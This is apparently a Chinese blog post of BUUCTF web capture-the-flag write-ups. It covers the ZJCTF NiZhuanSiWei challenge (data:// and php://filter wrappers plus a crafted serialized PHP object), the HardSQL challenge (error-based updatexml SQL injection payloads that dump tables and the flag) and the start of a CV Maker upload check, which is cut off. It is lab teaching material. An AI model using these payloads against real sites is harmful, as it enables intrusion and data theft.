

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Englobe">
  <meta name="keywords" content="">
  
    <meta name="description" content="[ZJCTF 2019]NiZhuanSiWei 1知识点： data:&#x2F;&#x2F;　　　　写入数据 php:&#x2F;&#x2F;input　　执行php 　　&#x2F;&#x2F;filter　　查看源码 12345678910111213141516171819&lt;?php $text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&amp;qu">
<meta property="og:type" content="article">
<meta property="og:title" content="buuctf">
<meta property="og:url" content="http://example.com/2023/08/06/%E5%88%B7%E9%A2%98/buuctf(web)/index.html">
<meta property="og:site_name" content="Englobe blog">
<meta property="og:description" content="[ZJCTF 2019]NiZhuanSiWei 1知识点： data:&#x2F;&#x2F;　　　　写入数据 php:&#x2F;&#x2F;input　　执行php 　　&#x2F;&#x2F;filter　　查看源码 12345678910111213141516171819&lt;?php $text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&amp;qu">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.imgs.ovh/2023/11/20/HO4VI.png">
<meta property="og:image" content="https://i.imgs.ovh/2023/11/20/HODpv.png">
<meta property="og:image" content="https://i.imgs.ovh/2023/12/07/fFkDU.png">
<meta property="og:image" content="https://i.imgs.ovh/2023/12/07/fFBZ0.png">
<meta property="og:image" content="https://i.imgs.ovh/2023/12/07/fFRZd.png">
<meta property="og:image" content="https://i.imgs.ovh/2023/12/07/fFcKK.png">
<meta property="og:image" content="https://i.imgs.ovh/2023/12/07/fFe42.png">
<meta property="og:image" content="https://i0.imgs.ovh/2024/03/06/QxTMV.png">
<meta property="og:image" content="https://i0.imgs.ovh/2024/03/06/QxqSJ.png">
<meta property="og:image" content="https://i0.imgs.ovh/2024/03/06/Qx9dW.png">
<meta property="og:image" content="https://i0.imgs.ovh/2024/03/06/QxN2v.png">
<meta property="og:image" content="https://i0.imgs.ovh/2024/03/06/Qxahe.png">
<meta property="og:image" content="https://i0.imgs.ovh/2024/03/07/QUgou.png">
<meta property="og:image" content="https://i0.imgs.ovh/2024/03/07/QUtYl.png">
<meta property="og:image" content="https://i0.imgs.ovh/2024/03/07/QUJrd.png">
<meta property="og:image" content="https://i0.imgs.ovh/2024/03/07/QUiyj.png">
<meta property="og:image" content="https://i0.imgs.ovh/2024/03/07/QU5cV.png">
<meta property="og:image" content="https://i0.imgs.ovh/2024/03/11/RsfCK.png">
<meta property="og:image" content="https://i0.imgs.ovh/2024/03/11/RxP8J.png">
<meta property="og:image" content="https://i0.imgs.ovh/2024/03/11/Rx0tC.png">
<meta property="og:image" content="https://i0.imgs.ovh/2024/03/11/Rxs7N.png">
<meta property="og:image" content="https://i0.imgs.ovh/2024/03/11/RxxDR.png">
<meta property="og:image" content="https://i0.imgs.ovh/2024/03/11/RxbZp.png">
<meta property="og:image" content="https://i0.imgs.ovh/2024/03/14/cEVIA.png">
<meta property="og:image" content="https://i0.imgs.ovh/2024/03/14/cEFRU.png">
<meta property="og:image" content="https://i0.imgs.ovh/2024/03/16/e2vNK.png">
<meta property="og:image" content="https://i0.imgs.ovh/2024/03/16/eFP7j.png">
<meta property="og:image" content="https://i0.imgs.ovh/2024/03/21/gXR60.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202404072018649.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202404252111710.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202404072038303.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202404072036189.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202404072040472.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202404072047596.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202404072048531.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202404072053818.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202404082148359.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202404082151012.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202404212201756.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202404212201110.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202405072029587.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202405072031739.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202405072034540.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202405082146551.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202405102214418.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202405102216631.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202406032115701.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202406032119661.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202406032212332.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202406032213051.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202406042110997.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202406042128644.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202406051946914.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202406052121580.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202406062157982.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202406062157903.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202406062159494.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202406062229704.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202406062230898.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202410232234635.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202410242208874.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Englobe/picture/main/202410242210671.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/1960851/202008/1960851-20200805135615946-1047568535.png">
<meta property="article:published_time" content="2023-08-06T15:54:21.000Z">
<meta property="article:modified_time" content="2024-11-14T13:00:32.192Z">
<meta property="article:author" content="Englobe">
<meta property="article:tag" content="buuctf">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.imgs.ovh/2023/11/20/HO4VI.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>buuctf - Englobe blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Englobe</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/1.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="buuctf"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-08-06 23:54" pubdate>
          2023年8月6日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          71k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          593 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">buuctf</h1>
            
            
              <div class="markdown-body">
                
                <h2 id="ZJCTF-2019-NiZhuanSiWei-1"><a href="#ZJCTF-2019-NiZhuanSiWei-1" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei 1"></a>[ZJCTF 2019]NiZhuanSiWei 1</h2><p>知识点：</p>
<p>data:&#x2F;&#x2F;　　　　写入数据</p>
<p>php:&#x2F;&#x2F;input　　执行php</p>
<p>　　&#x2F;&#x2F;filter　　查看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>　　我们需要get方式提交参数，text、file、password。</p>
<p>然后就是来到了第一个需要绕过的地方</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))<br></code></pre></td></tr></table></figure>

<p>　　要求text不为空，这是肯定的，主要看下一句，file_get_contents($text,’r’)&#x3D;&#x3D;&#x3D;”welcome to the zjctf”,从文件里读取字符串，还要和welcome to the zjctf相等。</p>
<p>这时候就用到了我们的data:&#x2F;&#x2F; 写入协议了</p>
<p>于是我们先构造第一个payload:?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</p>
<p>下面我们不能用flag.php来访问，因为被正则匹配，我们就拿不到反序列化后的password了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>       <span class="hljs-keyword">exit</span>();<br>   &#125;<span class="hljs-keyword">else</span>&#123;<br>       <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>       <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>       <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>   &#125;<br></code></pre></td></tr></table></figure>

<p>　　</p>
<p>下一个我们就该反序列化password了，但是我们又看到了useless.php文件包含，在这之前我们需要先读取里面的源码，然后将password反序列化出来。</p>
<p>于是我们构造第二个payload:file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p>
<p>这时候你会得到一串base64的编码，然后我们解码就得到了源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125; <br>    &#125; <br>&#125; <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p>　得到源码之后，我们将这个源码中的$file赋值flag.php，反序列化一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&quot;flag.php&quot;</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125; <br>    &#125; <br>&#125; <br><span class="hljs-variable">$password</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$password</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p>　　然后可以找在线的php解释器执行一下，也可以用自己的phpstudy本地服务器运行一下，我因为又本地服务器，我就再本地服务器上面跑了一下，于是得到反序列化的password</p>
<p>O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
<p>这样我们重新构造最终的payload:</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">?<span class="hljs-type">text</span>=data://<span class="hljs-type">text</span>/plain,welcome<span class="hljs-meta">%20to</span><span class="hljs-meta">%20the</span><span class="hljs-meta">%20zjctf</span>&amp;file=useless.php&amp;password=O:<span class="hljs-number">4</span>:<span class="hljs-meta">%22Flag</span><span class="hljs-meta">%22:1:</span>&#123;s:<span class="hljs-number">4</span>:<span class="hljs-meta">%22file</span><span class="hljs-meta">%22</span>;s:<span class="hljs-number">8</span>:<span class="hljs-meta">%22flag</span>.php<span class="hljs-meta">%22</span>;&#125;<br></code></pre></td></tr></table></figure>

<h2 id="极客大挑战-2019-HardSQL-1"><a href="#极客大挑战-2019-HardSQL-1" class="headerlink" title="[极客大挑战 2019]HardSQL 1"></a>[极客大挑战 2019]HardSQL 1</h2><p>sql注入题，先试试万能密码username&#x3D;<code>1&#39; or 1=1#</code><br>password&#x3D;123</p>
<p>经过一系列尝试后，发现空格，&#x3D;，union都被过滤了<br>空格被过滤我们使用()来代替空格 &#x2F;**&#x2F;貌似也被过滤了<br>既然如此，尝试一下报错注入</p>
<p><strong>爆库</strong><br>payload：<code>username=1&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#&amp;password=1</code></p>
<p><strong>爆表</strong><br>payload:<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#&amp;password=1</code></p>
<p><strong>爆字段</strong><br>payload:<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))#&amp;password=1</code></p>
<p><strong>爆值</strong><br>payload：<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#&amp;password=1</code></p>
<p>并没有成功显示flag，只显示了一半~<br>经过查询知道了right()可以查询后面的部分<br>payload：<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1)),0x7e),1))#&amp;password=1</code><br>和前面显示出的flag拼接删改得到完整的flag</p>
<h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>			<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>			    <span class="hljs-variable">$image_type</span> = <span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$filename</span>);<br>			    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$image_type</span>) &#123;<br>			        <span class="hljs-keyword">case</span> IMAGETYPE_GIF:<br>			            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;gif&quot;</span>;<br>			            <span class="hljs-keyword">break</span>;<br>			        <span class="hljs-keyword">case</span> IMAGETYPE_JPEG:<br>			            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;jpg&quot;</span>;<br>			            <span class="hljs-keyword">break</span>;<br>			        <span class="hljs-keyword">case</span> IMAGETYPE_PNG:<br>			            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;png&quot;</span>;<br>			            <span class="hljs-keyword">break</span>;<br>			        <span class="hljs-keyword">default</span>:<br>			            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>			            <span class="hljs-keyword">break</span>;<br>			    &#125;<br>			&#125;<br>			<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>				<span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>				<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">isImage</span>(<span class="hljs-variable">$temp_file</span>)) &#123;<br>					<span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>					<span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>);<br>				    <span class="hljs-variable">$img_path</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;_Hz&quot;</span>]).<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$ext</span>;<br>				    <span class="hljs-variable">$fn</span> = <span class="hljs-string">&quot;uploads/&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;_Hz&quot;</span>]).<span class="hljs-string">&quot;.*&quot;</span>;<br>				    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-variable">$fn</span>)) &#123;<br>				    	<span class="hljs-variable">$ffn</span> = <span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-variable">$fn</span>)[<span class="hljs-number">0</span>];<br>				    	<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$ffn</span>);<br>				    &#125;<br>				    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>))&#123;<br>				        <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>				    &#125; <span class="hljs-keyword">else</span> &#123;<br>				        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>				    &#125;<br>				    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$is_upload</span>) &#123;<br>				    	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;cc-profile-image&quot;&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;&#x27;</span>.<span class="hljs-variable">$img_path</span>.<span class="hljs-string">&#x27;&quot; alt=&quot;Image&quot;/&gt;&lt;/a&gt;&lt;/div&gt;&lt;/br&gt;&#x27;</span>;<br>				    &#125;<span class="hljs-keyword">else</span>&#123;<br>				    	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;h2 